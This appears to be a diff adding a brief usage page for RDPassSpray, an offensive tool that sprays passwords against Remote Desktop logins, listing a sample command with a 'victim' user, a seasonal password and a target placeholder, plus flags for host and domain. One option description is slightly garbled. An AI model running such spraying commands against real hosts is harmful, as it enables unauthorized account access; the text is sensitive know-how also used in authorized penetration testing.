@@ -1,0 +1,12 @@
+RDPassSpray - password spraying using RDP 
+Source: https://github.com/xFreed0m/RDPassSpray
+
+Usage:
+  RDPassSpray -u victim -p Spring2021! -t TARGET_IP:PORT
+                                      password spray against RDP
+
+Options:
+-u   specify the VICTIM as a username
+-p   option set the Spring2021!
+-t   select a single host to attack
+-d   specify a domain name if we are in an Active Directory environment
